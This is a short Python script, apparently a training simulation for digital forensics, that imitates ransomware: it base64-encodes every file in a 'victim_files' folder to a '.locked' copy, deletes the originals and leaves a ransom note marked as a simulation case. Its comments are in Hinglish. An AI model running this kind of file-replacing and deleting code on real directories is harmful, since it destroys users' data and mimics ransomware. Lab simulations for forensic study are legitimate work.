import os
import base64

# Target folder
TARGET = os.path.expanduser("~/dfir_cases/ransomware_case/victim_files")

# Har file encrypt karo
for filename in os.listdir(TARGET):
    filepath = os.path.join(TARGET, filename)
    
    # File padho
    with open(filepath, 'rb') as f:
        data = f.read()
    
    # Encode karo
    encoded = base64.b64encode(data)
    
    # .locked naam se save karo
    with open(filepath + ".locked", 'wb') as f:
        f.write(encoded)
    
    # Original hatao
    os.remove(filepath)
    
    print("Encrypted:", filename)

# Ransom note banao
with open(TARGET + "/READ_ME_NOW.txt", 'w') as f:
    f.write("YOUR FILES ARE ENCRYPTED - SIM-2026-CASE02")

print("Done! Ransom note dropped!")
